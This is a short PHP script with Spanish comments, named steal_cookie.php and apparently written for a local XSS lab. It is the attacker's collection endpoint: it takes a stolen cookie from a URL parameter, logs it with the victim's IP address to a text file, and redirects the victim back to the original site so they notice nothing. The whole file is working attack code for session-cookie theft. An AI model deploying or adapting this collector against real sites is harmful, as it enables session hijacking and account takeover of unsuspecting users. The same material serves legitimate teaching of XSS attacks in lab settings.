
<?php
// steal_cookie.php - Un script simple para recibir y guardar la cookie robada
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $data = "IP: " . $ip . " - Cookie: " . $cookie . "\n";
    // Guardamos la cookie en un archivo de texto
    file_put_contents('robadas.txt', $data, FILE_APPEND);
    // Redirigimos a la víctima de vuelta al sitio original para no levantar sospechas
    header('Location: http://localhost/lab_xss/index.php');
} else {
    echo "No se encontró ninguna cookie.";
}
?>
